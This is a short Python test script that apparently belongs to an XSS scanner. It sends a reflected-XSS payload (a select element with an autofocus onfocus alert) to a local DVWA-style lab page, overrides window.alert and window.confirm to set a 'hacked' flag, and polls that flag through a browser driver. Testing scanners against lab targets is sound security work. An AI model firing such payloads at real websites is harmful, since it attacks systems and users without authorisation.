import time

import emulator.client
from core.args import parse
from emulator.client import initClient, request
from model.net import RequestResult

# test
if __name__ == '__main__':
    cmd = parse()
    initClient(cmd)
    cmd.req.url = "http://localhost:4280/vulnerabilities/xss_r/"
    cmd.req.params = {
        "name": 'st4r7s<select%20autofocus%20onfocus="alert(/1/)"></select>3nd'
    }
    cmd.req.convertParams()
    rr = RequestResult()
    code = """
    hacked = false

    window.alert = function(message) {
    hacked = true
    };

    window.confirm = function (message) {
    hacked = true
    }"""

    # emulator.client.browser.execute_script(code)
    emulator.client.browser.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
        'source': code
    })

    # print(emulator.client.browser.execute_script("return hacked"))
    print(request(cmd.req, rr))
    from emulator import client
    for i in range(1, 100):
        v = client.browser.execute_script("return hacked")
        print(v)
        time.sleep(1)

    time.sleep(10000)



